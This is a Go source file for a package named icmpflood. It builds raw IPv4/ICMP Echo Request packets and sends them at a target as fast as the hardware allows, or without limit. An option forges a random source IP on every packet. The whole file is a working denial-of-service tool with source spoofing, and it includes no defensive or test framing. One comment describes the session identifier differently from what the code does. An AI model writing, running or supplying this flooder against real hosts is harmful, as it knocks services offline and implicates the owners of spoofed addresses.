// Package icmpflood implements an ICMP Echo Request flood.
//
// A raw AF_INET/SOCK_RAW/IPPROTO_RAW socket is used so the
// kernel handles routing and Ethernet — we only build the IP and ICMP layers.
// IPPROTO_RAW implicitly enables IP_HDRINCL, giving full control over the IP
// source address for --random-source spoofing.
//
// Each packet is an ICMP Echo Request (type 8, code 0) with a fixed session
// identifier (getpid() & 0xffff) and an incrementing
// sequence number. The payload is 56 zero bytes (matching Linux ping default,
// total ICMP = 64 bytes, total IP = 84 bytes).
package icmpflood

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"
)

const (
	icmpFloodTag = "\x1b[94m[ICMP]\x1b[0m" // bright blue
	icmpDataLen  = 56                        // payload size → ICMP = 64 B, IP = 84 B
)

// rawSocket is satisfied by the platform-specific implementation.
type rawSocket interface {
	Send(pkt []byte) error
	Close() error
}

// Flooder sends ICMP Echo Requests until Count packets are delivered or Ctrl+C.
type Flooder struct {
	Interface    string
	Target       string // IPv4 address or hostname
	Count        int    // 0 = unlimited
	Rate         int    // target pps; 0 = full hardware speed
	RandomSource bool   // spoof a new random source IP every packet
}

// Run resolves the target, opens the raw socket, and floods.
func (f *Flooder) Run() error {
	dstIP, err := resolveIPv4(f.Target)
	if err != nil {
		return fmt.Errorf("target %q: %w", f.Target, err)
	}

	var srcIP [4]byte
	if !f.RandomSource {
		srcIP, err = interfaceIPv4(f.Interface)
		if err != nil {
			return fmt.Errorf("source IP on %s: %w (try --random-source)", f.Interface, err)
		}
	}

	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}

	sock, err := openRawSocket(iface, dstIP)
	if err != nil {
		return err
	}
	defer sock.Close()

	// Session ID fixed for this run.
	id := randU16()
	var seq uint16
	var total int64

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total packets sent: %d\n", icmpFloodTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&total)
			fmt.Printf("\r%s Total: %-12d  Rate: %-8d pps    ", icmpFloodTag, cur, cur-prev)
			prev = cur
		}
	}()

	mode := "fixed source"
	if f.RandomSource {
		mode = "random source"
	}
	if f.Count > 0 {
		fmt.Printf("%s Sending %d ICMP Echo Requests → %s (%s) — press Ctrl+C to stop.\n",
			icmpFloodTag, f.Count, f.Target, mode)
	} else {
		fmt.Printf("%s Flooding %s with ICMP Echo Requests (%s) — press Ctrl+C to stop.\n",
			icmpFloodTag, f.Target, mode)
	}

	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()

	for {
		if f.Rate > 0 {
			if now := time.Now(); now.Before(next) {
				time.Sleep(next.Sub(now))
			}
			next = next.Add(interval)
		}

		if f.RandomSource {
			srcIP = randIPv4()
		}

		_ = sock.Send(buildEcho(srcIP, dstIP, id, seq))
		seq++
		n := atomic.AddInt64(&total, 1)

		if f.Count > 0 && n >= int64(f.Count) {
			fmt.Printf("\n%s Done. Sent %d ICMP Echo Requests to %s.\n", icmpFloodTag, n, f.Target)
			return nil
		}
	}
}

// buildEcho constructs one IPv4/ICMP Echo Request packet (no Ethernet header).
//
// Wire layout (84 bytes):
//
//	[0:20]  IPv4 header  v=4 IHL=5 proto=ICMP(1) TTL=64 src/dst
//	[20:28] ICMP header  type=8 code=0 checksum id seq
//	[28:84] ICMP payload 56 zero bytes
func buildEcho(srcIP, dstIP [4]byte, id, seq uint16) []byte {
	pkt := make([]byte, 20+8+icmpDataLen)

	// IPv4 header [0:20]
	pkt[0] = 0x45 // version=4, IHL=5
	// pkt[1] = 0  DSCP/ECN
	binary.BigEndian.PutUint16(pkt[2:4], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:6], randU16()) // IP ID
	// pkt[6:8] = flags/frag = 0
	pkt[8] = 64 // TTL
	pkt[9] = 1  // protocol = ICMP
	// pkt[10:12] = checksum, filled below
	copy(pkt[12:16], srcIP[:])
	copy(pkt[16:20], dstIP[:])
	binary.BigEndian.PutUint16(pkt[10:12], onesCompSum(pkt[:20]))

	// ICMP header [20:28]
	pkt[20] = 8 // type: Echo Request
	pkt[21] = 0 // code: 0
	// pkt[22:24] = checksum, filled below
	binary.BigEndian.PutUint16(pkt[24:26], id)
	binary.BigEndian.PutUint16(pkt[26:28], seq)
	// pkt[28:84] = data (zero)

	// ICMP checksum covers header + data [20:]
	binary.BigEndian.PutUint16(pkt[22:24], onesCompSum(pkt[20:]))

	return pkt
}

// onesCompSum computes the RFC 791 / RFC 792 one's complement checksum.
// The checksum field in the data must be zeroed before calling.
func onesCompSum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// resolveIPv4 parses or resolves target to an IPv4 address.
func resolveIPv4(target string) ([4]byte, error) {
	ip := net.ParseIP(target)
	if ip == nil {
		hosts, err := net.LookupHost(target)
		if err != nil || len(hosts) == 0 {
			return [4]byte{}, fmt.Errorf("cannot resolve")
		}
		ip = net.ParseIP(hosts[0])
	}
	v4 := ip.To4()
	if v4 == nil {
		return [4]byte{}, fmt.Errorf("must be an IPv4 address")
	}
	var a [4]byte
	copy(a[:], v4)
	return a, nil
}

// interfaceIPv4 returns the first IPv4 address assigned to ifaceName.
func interfaceIPv4(ifaceName string) ([4]byte, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return [4]byte{}, err
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return [4]byte{}, err
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			if v4 := ipNet.IP.To4(); v4 != nil {
				var a [4]byte
				copy(a[:], v4)
				return a, nil
			}
		}
	}
	return [4]byte{}, fmt.Errorf("no IPv4 address on interface %s", ifaceName)
}

func randIPv4() [4]byte {
	var ip [4]byte
	rand.Read(ip[:])
	return ip
}

func randU16() uint16 {
	var b [2]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint16(b[:])
}
